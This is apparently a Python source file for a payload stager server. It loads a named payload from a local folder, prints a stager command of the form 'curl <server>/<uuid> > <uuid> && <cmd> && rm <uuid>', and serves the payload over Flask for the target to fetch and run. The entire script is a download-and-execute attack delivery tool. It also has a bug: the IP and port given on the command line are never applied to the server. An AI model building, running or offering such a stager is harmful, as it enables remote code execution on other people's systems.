#!/usr/bin/python3

from flask import Flask, send_file
from subprocess import Popen, PIPE
import json, uuid, argparse

server_url = "http://127.0.0.1:5000/"
server_ip = lambda: server_url.split("/")[2].split(":")[0]
server_port = lambda: int(server_url.split("/")[2].split(":")[1])

sh = lambda cmd: Popen(cmd,stdout=PIPE,shell=True).communicate()[0]

def payloads():
	pl = sh("ls payloads").decode().split("\n")
	while "" in pl:
		pl.remove("")
	return pl
def get_payload(name):
	try:
		cfg = json.loads(open("payloads/%s/config.json" % name,"r").read())
	except:
		return False
	return cfg

def build_stager(payload):
	cmd = payload['cmd']
	uid = str(uuid.uuid4())
	cmd = cmd % uid
	dl = "curl %s%s > %s" % (server_url, uid, uid)
	rm = "rm %s" % uid
	res = " && ".join([dl,cmd,rm])
	return res, uid

def serve_payload(uid, name, fn):
	app = Flask(__name__)
	@app.route("/%s" % uid)
	def app_main():
		return send_file("payloads/%s/%s" % (name,fn))
	app.run(host=server_ip(),port=server_port())

def parse_args():
	parser = argparse.ArgumentParser()
	parser.add_argument(
		"-i","--ip",
		help=("IP to listen on. Eg: --ip 0.0.0.0"),
		required=True)
	parser.add_argument(
		"-p","--port",
		help=("Port to use for the server. Eg: --port 8080"),
		required=True)
	parser.add_argument(
		"-n","--name",
		help=("Payload name. Eg: --name example"),
		required=True)
	args = parser.parse_args()
	return args

def main(args):
	server_url = "http://%s:%s/" % (args.ip,args.port)
	name = args.name
	if not name in payloads():
		print("Error: %s not in payloads. Available:" % name)
		print(" , ".join(payloads()))
		return 1
	payload = get_payload(name)
	cmd, uid = build_stager(payload)
	filename = payload['filename']
	print("Stager command: %s" % cmd)
	input("Press [Enter] to start the server...")
	try:
		serve_payload(uid,name,filename)
	except KeyboardInterrupt:
		return 0
if __name__ == "__main__":
	exit(main(parse_args()))